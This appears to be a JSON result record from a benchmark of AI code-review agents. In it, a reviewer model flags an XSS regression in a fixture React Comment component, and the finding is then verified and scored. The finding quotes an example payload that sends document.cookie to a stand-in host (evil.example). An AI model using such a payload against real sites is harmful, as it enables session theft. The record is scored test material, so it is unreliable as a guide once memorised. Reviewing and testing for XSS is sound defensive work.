@@ -1,0 +1,95 @@
+{
+  "case": "C009",
+  "pr": "C009",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 34.7,
+  "setup_seconds": 0.0,
+  "total_seconds": 34.8,
+  "usage": {
+    "in": 16192,
+    "cache_read": 100480,
+    "cache_write": 0,
+    "out": 1442,
+    "source": "cli"
+  },
+  "cost_usd": 0.07118,
+  "changed_files": [
+    "src/components/Comment.tsx"
+  ],
+  "findings": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity": "critical",
+      "body": "**XSS: unsanitized `body` is injected as HTML.** Removing `escapeHtml` and passing `body` directly into `dangerouslySetInnerHTML` means any comment author (or API that supplies `body`) can run arbitrary script in readers\u2019 sessions \u2014 e.g. `<img src=x onerror=\"fetch(https://evil.example/steal?c=+document.cookie)\">` or `<script>\u2026</script>`.\n\nFailure mode: malicious or compromised comment content executes in the app origin with the victim\u2019s cookies/session.\n\nFix: do not assign untrusted strings to `__html`. Either (1) render plain text / React children, (2) parse a limited markdown subset into React elements, or (3) sanitize with a strict allowlist library before `dangerouslySetInnerHTML`. Restore escaping until one of those is in place:\n\n```suggestion\n  return <div className=\"comment\">{body}</div>;\n```"
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a stored/reflected XSS vulnerability by removing HTML escaping and injecting the raw `body` string into the DOM via `dangerouslySetInnerHTML`.\n\n## Analysis\n\n`Comment` previously ran `body` through `escapeHtml` before assigning it to `__html`, which neutralized `<`, `>`, and `&`. The PR deletes that helper and passes `body` straight through. Any comment payload containing HTML or script (e.g. `<img src=x onerror=...>`, `<script>...`, `javascript:` links) will execute in the viewer\u2019s browser with the app\u2019s origin privileges.\n\nThe stated goal (\u201crich formatting / bold / links\u201d) is not implemented either: there is no markdown parser and no HTML sanitizer (e.g. DOMPurify allowlist). Raw HTML injection is not a substitute for controlled formatting.\n\n## Recommendation\n\nKeep user-controlled content out of `dangerouslySetInnerHTML` unless it is sanitized with a strict allowlist, or render markdown to React elements instead of HTML strings. Restore escaping (or plain-text rendering) until a safe rich-text path exists.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 30,
+  "budget": {
+    "tier": "standard",
+    "profile": "fixed",
+    "turns": 30,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": false
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch removes escapeHtml and passes the untrusted body string straight into dangerouslySetInnerHTML, which is a real XSS regression versus the base version that escaped &, <, and >. Critical severity is appropriate for arbitrary script execution in the app origin."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.376,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2671,
+      "out": 340
+    },
+    "cost_usd": 0.008278
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C009-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
